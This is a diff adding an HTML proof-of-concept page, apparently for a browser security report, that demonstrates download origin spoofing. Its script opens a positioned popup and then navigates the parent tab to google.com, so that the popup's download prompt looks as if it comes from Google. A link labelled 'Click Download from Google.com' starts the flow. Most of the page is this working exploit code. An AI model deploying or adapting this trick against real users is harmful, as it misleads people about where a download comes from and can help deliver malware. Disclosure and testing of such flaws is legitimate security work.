@@ -1,0 +1,38 @@
+<!doctype html>
+<html>
+<head>
+<style>
+html { font-family: sans-serif; }
+#linkElem {
+  position: absolute;
+  top: 320px;
+  left: calc(50vw - 115px);
+  width: 230px;
+  text-align: center;
+  font-size: 1.5em;
+}
+</style>
+</head>
+<body>
+<h1>Popup-based download origin spoofing / download UI overlay</h1>
+<p>A small popup + delayed navigation flow causes a browser download UI (or a download prompt/notification) to appear visually over the parent tab’s address bar and chrome, making it look like the download came from the visible tab’s origin rather than the true popup origin.</p>
+<a id="linkElem" href="#">Click Download from Google.com</a>
+<script>
+linkElem.addEventListener('click', (e) => {
+  e.preventDefault();
+  var topPos = 200 + window.screenTop;
+  var popupWidth = 340;
+  var leftPos = (window.innerWidth / 2) - (popupWidth / 2) + window.screenLeft;
+  window.open(
+    'test1.html',
+    'test',
+    'width='+popupWidth+',height=240,top='+topPos+',left='+leftPos
+  );
+
+  setTimeout(() => {
+    window.location = 'https://google.com';
+  }, 100);
+});
+</script>
+</body>
+</html>
